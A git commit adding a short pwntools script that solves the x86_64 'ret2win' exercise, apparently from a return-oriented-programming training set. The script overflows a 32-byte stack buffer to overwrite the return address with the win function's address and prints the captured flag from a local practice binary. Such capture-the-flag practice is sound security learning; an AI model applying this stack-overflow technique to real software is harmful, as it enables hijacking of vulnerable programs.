dbc0151fac567b40ac492c65abed3ccae2fd98d2
s1mpl3ss0 <114217855+s1mpl3ss0@users.noreply.github.com>
2025-11-26 14:41:25 +0100

    Add ret2win x86_64

---
+++ 1_ret2win/1_ret2win_x64.py
@@ -0,0 +1,32 @@
+from pwn import *
+
+elf = ELF("ret2win_patched")
+
+context.binary = elf
+context.terminal = ['konsole', '-e']
+context.log_level = logging.INFO
+
+gdbscript = '''
+set follow-fork-mode parent
+break *ret2win
+continue
+'''
+
+def connection():
+    if args.GDB:
+        c = gdb.debug([elf.path], gdbscript=gdbscript)
+    else:
+        c = process([elf.path])
+    return c
+
+BUFFER_SIZE = 32
+
+def main():
+    payload = flat({BUFFER_SIZE + context.bytes: elf.symbols.ret2win + 0xe})
+
+    c = connection()
+    c.sendlineafter(b'> ', payload)
+    print(c.recvregex(rb'ROPE{.*}', capture=True).group().strip().decode())
+
+if __name__ == '__main__':
+    main()
